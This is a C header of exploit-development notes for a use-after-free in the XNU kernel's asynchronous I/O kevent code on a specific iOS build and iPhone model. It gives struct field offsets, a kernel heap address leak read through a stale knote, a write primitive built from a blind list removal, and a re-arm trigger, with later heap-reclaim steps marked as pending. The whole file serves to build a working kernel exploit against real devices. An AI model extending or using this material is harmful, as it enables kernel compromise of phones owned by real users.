/*
 * b12_offsets.h — T1 output. iOS 26.2 / 23C55 / iPhone14,5 (A15) / xnu-12377.62.10.
 *
 * ANCHOR CHAIN (read this before using any constant):
 *   - xnu-12377.62.10 (device build) source is UNPUBLISHED (opensource.apple.com 404,
 *     no github tag). Offsets below are closed by SANDWICH:
 *       (a) struct aio_workq_entry is byte-identical between the two public anchors
 *           xnu-12377.61.12 (local, /home/abzal/xnu) and xnu-12377.81.4 (iOS 26.3,
 *           /tmp/opencode/xnu-xnu-12377.81.4) — verified by diff this session.
 *       (b) all five AIO code-path panic strings below are present in the DEVICE
 *           kernelcache (UUID 6F9AD32F-3BEC-41D3-9B75-D8566AAAE7BF, verified identical
 *           to both panic-full logs) — the code that reads these fields ships on 23C55.
 *       (c) +0x20/+0x28 and +0x40 were confirmed on-device by upstream (crazymind90
 *           CVE-2026-XNU-AIO-KEVENT-UAF) via kev.ext[] on iPhone 11 Pro 26.2, same
 *           xnu line (ext assignment code identical 61.12:2564-2565 / 81.4:2636-2637).
 *   - Conclusion: [VB-SANDWICH]. Remaining doubt is limited to inlining/layout choices
 *     inside functions, not field offsets. Exact command that would upgrade any entry
 *     to direct [VB-62.10-DISASM]: parse the kernel fileset entry (LC_FILESET_ENTRY,
 *     UUID 6F9AD32F), disassemble <fn>, read the immediate offsets. Named per field.
 *
 * Tags: [VB] verified-binary/source · [VP] verified-panic-on-device · [AS] assumed.
 */

#ifndef NK_B12_OFFSETS_H
#define NK_B12_OFFSETS_H

/* ---------------------------------------------------------------------------
 * 1. struct aio_workq_entry — 192-byte kalloc_type class. [VB]
 *    Def: 61.12 kern_aio.c:172-194, identical 81.4 kern_aio.c:173-195 (diffed).
 *    Runtime size class: kalloc.type.192 [VP on-device]; computes 176B -> 192 class.
 *    Zone: KALLOC_TYPE_DEFINE(aio_workq_zonep, aio_workq_entry, KT_DEFAULT)
 *          61.12:372 / 81.4:373. KC string "site.aio_workq_entry" [VB].
 *    Free zeroes? kalloc_type semantics + alloc Z_ZERO (61.12:1873 / 81.4:1929,
 *    zalloc_flags(Z_WAITOK|Z_ZERO)) => a slot not reclaimed reads ALL-ZERO. [VB]
 * ------------------------------------------------------------------------- */
#define B12_STRUCT_SIZE        184         /* [VB ON-DEVICE] read from the device KC this
                                            * session: kt_size of the aio_workq_entry
                                            * kalloc_type_view = 184 (com.apple.kernel
                                            * fileset entry, __kalloc_type rec706).
                                            * BOTH public anchors (61.12, 81.4) define the
                                            * struct as 176 — the +8 is a 62.10-only
                                            * delta, i.e. exactly the per-build trap. */
#define B12_SLOT_SIZE          192         /* [VP] runtime class kalloc.type.192 */
#define B12_SLOT_QWORDS        24          /* 192/8 */
#define B12_SLACK_QWORDS       1           /* qword 23 (0xB8-0xBF): zeroed at alloc,
                                            * no userspace knob of ours writes it */

/* aio_workq_link — the WORKQ list (aio_anchor.aio_async_workqs[0].aioq_entries) */
#define B12_OFF_WORKQ_NEXT     0x00        /* [VB] TAILQ_ENTRY field 1 */
#define B12_OFF_WORKQ_PREV     0x08        /* [VB] TAILQ_ENTRY field 2 */

/* aio_proc_link — the PROC list (p->p_aio_activeq / p->p_aio_doneq). [VB]
 * These are the two fields TAILQ_REMOVE consumes in the write channel. */
#define B12_OFF_PROC_NEXT      0x10        /* tqe_next  [VB] */
#define B12_OFF_PROC_PREV      0x18        /* tqe_prev  [VB] <- *(tqe_prev)=tqe_next */

#define B12_OFF_RETURNVAL      0x20        /* user_ssize_t [VB] -> kev.ext[1] */
#define B12_OFF_ERRORVAL       0x28        /* errno_t (32b) [VB] -> kev.ext[0] */
#define B12_OFF_REFCOUNT       0x2C        /* os_refcnt_t [VB] unref hinge */
#define B12_OFF_FLAGS          0x30        /* aio_entry_flags_t; AIO_COMPLETED=0x100 [VB] */
#define B12_OFF_LIO_PENDING    0x34        /* int [VB] */
#define B12_OFF_LIO_LEADER     0x38        /* struct aio_workq_entry* [VB] */
#define B12_OFF_PROCP          0x40        /* struct proc* [VB] (+0x58 = p_mlock) */
#define B12_OFF_UAIOCBP        0x48        /* user_addr_t — OUR aiocb address [VB] */

/* aiocb copy at +0x50 (struct user_aiocb, bsd/sys/aio.h). [VB]
 * Layout inside the copy (offsets are aiocb-relative):
 *   +0x00 aio_fildes (int)   +0x08 aio_offset  (off_t)      <- knob K_OFFSET
 *   +0x10 aio_buf   (addr)   +0x18 aio_nbytes  (user_size_t)<- knob K_NBYTES
 *   +0x20 aio_reqprio(int)   +0x28 aio_sigevent (32B):
 *        +0x28 +0x00 sigev_notify(int) +0x04 sigev_signo(int)
 *        +0x30 +0x08 sigev_value (8B)   <- knob K_SIGVAL (arbitrary 64-bit)
 *        +0x40 +0x18 notify_function    +0x48 +0x20 notify_attributes
 *   +0x50 aio_lio_opcode (int)
 * => in-slot absolute addresses of the user-supplied qwords: */
#define B12_OFF_AIOCB          0x50        /* [AS — RESOLVE ON DEVICE] struct user_aiocb copy.
                                            * 61.12/81.4 put it at +0x50, but the device
                                            * struct is +8 larger. The extra qword is
                                            * either BEFORE aiocb (aiocb @+0x58, in-slot
                                            * aio_offset @+0x60, aio_nbytes @+0x70,
                                            * sigval @+0x88) or AFTER aio_map (aiocb stays
                                            * @+0x50). T2's occupancy map settles it
                                            * on-device: per-field marker read-back tells
                                            * you which. All offsets <= +0x48 are unaffected
                                            * either way [VB]. */
#define B12_OFF_AIO_FILDES     (B12_OFF_AIOCB + 0x00)
#define B12_OFF_AIO_OFFSET     (B12_OFF_AIOCB + 0x08)   /* K_OFFSET lands here */
#define B12_OFF_AIO_BUF        (B12_OFF_AIOCB + 0x10)
#define B12_OFF_AIO_NBYTES     (B12_OFF_AIOCB + 0x18)   /* K_NBYTES lands here */
#define B12_OFF_AIO_REQPRIO    (B12_OFF_AIOCB + 0x20)
#define B12_OFF_AIO_SIGEV      (B12_OFF_AIOCB + 0x28)
#define B12_OFF_AIO_SIGVAL     (B12_OFF_AIOCB + 0x30)   /* K_SIGVAL lands here */
#define B12_OFF_AIO_LIO_OPCODE (B12_OFF_AIOCB + 0x50)

#define B12_OFF_VFS_CONTEXT    (B12_OFF_AIO_LIO_OPCODE + 0x10) /* +0xA0 kernel-set */
#define B12_OFF_AIO_MAP        (B12_OFF_VFS_CONTEXT + 0x08)    /* +0xA8 kernel-set */

/* proc struct */
#define B12_PROC_OFF_P_MLOCK   0x58        /* [VB] aio_proc_mutex() 61.12:490-493;
                                            * panic1 far=0x58 with procp=0 [VP] */

/* ---------------------------------------------------------------------------
 * 2. READ CHANNEL — what the stale knote returns. [VB]
 *    filt_aioprocess, 61.12:2550-2579 (81.4:2627-2651 same body minus the
 *    kn_hook NULLing the patch removed):
 *      entryp = knote_kn_hook_get_raw(kn);      // dangling after aio_return
 *      ...
 *      if (kn->kn_fflags) {
 *          kn->kn_ext[0] = entryp->errorval;    // 61.12:2564 / 81.4:2636  (+0x28)
 *          kn->kn_ext[1] = entryp->returnval;   // 61.12:2565 / 81.4:2637  (+0x20)
 *          knote_fill_kevent(kn, kev, 0);
 *          ...
 *    kev.ident  = uaiocbp (the userspace aiocb address, from attach time)
 *    kev.data  = kn->kn_data = the ORIGINAL entry kernel address —
 *                set in aio_register_kevent: "kev.data = (intptr_t)entryp;"
 *                61.12:1520 / 81.4:1534  [VB]  <== live kalloc.type.192 heap VA leak
 *    kev.udata = aio_sigevent.sigev_value.sival_ptr (attach time)
 *    Therefore one reap leaks: first-8=ext0(+0x28), second-8=ext1(+0x20),
 *    ident(userspace), data(ORIGINAL entry VA), udata(user), plus the full
 *    kevent64_s field set. Capture all of them (T2 requirement).
 * ------------------------------------------------------------------------- */

/* ---------------------------------------------------------------------------
 * 3. WRITE CHANNEL FRAME — proven, see write_mechanism.md for the citation.
 *    aio_proc_remove_done_locked (61.12:470-480 / 81.4:472-482) is a BLIND
 *    remove: TAILQ_REMOVE(&procp->p_aio_doneq, entryp, aio_proc_link) with no
 *    list search. TAILQ_REMOVE (bsd/sys/queue.h) performs:
 *        if (tqe_next != NULL) tqe_next->tqe_prev = tqe_prev;   // write A
 *        *(tqe_prev) = tqe_next;                                 // write B
 *    With entryp = reclaimed slot: write B is *(slot+0x18) = (slot+0x10).
 *    Values at +0x10/+0x18 of a same-subsystem reclaimed entry are KERNEL list
 *    pointers; a chosen value at +0x18 requires cross-type reclaim (T3).
 * ------------------------------------------------------------------------- */
#define B12_WRITE_A_ACTIVE     /* write A fires iff tqe_next(+0x10) != NULL */

/* ---------------------------------------------------------------------------
 * 4. TRIGGER (re-arm) — [VB]
 *    do_aio_completion_and_unlock tail (61.12:~800 / 81.4:2216-2218):
 *        lck_mtx_lock(&aio_klist_lock); KNOTE(&aio_klist, 1); lck_mtx_unlock(...);
 *    KNOTE walks the GLOBAL aio_klist -> filt_aioevent (61.12:2517-2542):
 *        entryp = knote_kn_hook_get_raw(kn);       // stale slot pointer
 *        if (entryp->flags & AIO_COMPLETED) {      // reads +0x30 of the SLOT
 *            kn->kn_fflags |= hint; ... FILTER_ACTIVE
 *        }
 *    Completion of ANY SIGEV_KEVENT entry arms EVERY knote whose stale slot
 *    currently shows AIO_COMPLETED. kevent64() reap then runs f_process.
 * ------------------------------------------------------------------------- */

/* ---------------------------------------------------------------------------
 * 5. FIX DIFFS 61.12 -> 81.4 (components i/ii/iii; device 62.10 = vulnerable side)
 *    (i)   filt_aioattach: +aio_entry_ref(entryp)               81.4:2557-2558
 *    (iii) filt_aiodetach: +aio_entry_unref(entryp)             81.4:2570-2581
 *    (ii)  aio_register_kevent moved BEFORE aio_try_enqueue_work_locked
 *          in both aio_queue_async_request and lio_listio       81.4:1712-1735
 *    (iv-not-fixed) filt_aioprocess body kept: ext reads, blind remove, unref
 *          (81.4 only dropped the kn_hook=NULL line)             81.4:2636-2643
 *    New: AIO_KEVENT_REGISTERED flag 0x400, aio_unregister_kevent,
 *    aio_return skips SIGEV_KEVENT entries                      81.4:129/860-870
 * ------------------------------------------------------------------------- */

/* flags */
#define B12_FLAG_READ          0x00000001
#define B12_FLAG_WRITE         0x00000002
#define B12_FLAG_FSYNC         0x00000004
#define B12_FLAG_DSYNC         0x00000008
#define B12_FLAG_LIO_WAIT      0x00000010  /* [AS] value from 61.12 enum, read enum
                                              bsd/kern/kern_aio.c:110-130 */
#define B12_FLAG_COMPLETED     0x00000100  /* [VB] gate checked by filt_aioevent */
#define B12_FLAG_CANCELLED     0x00000200
#define B12_FLAG_EXIT_WAIT     0x00000400  /* [AS] */
#define B12_FLAG_CLOSE_WAIT    0x00000800  /* [AS] */

#endif /* NK_B12_OFFSETS_H */
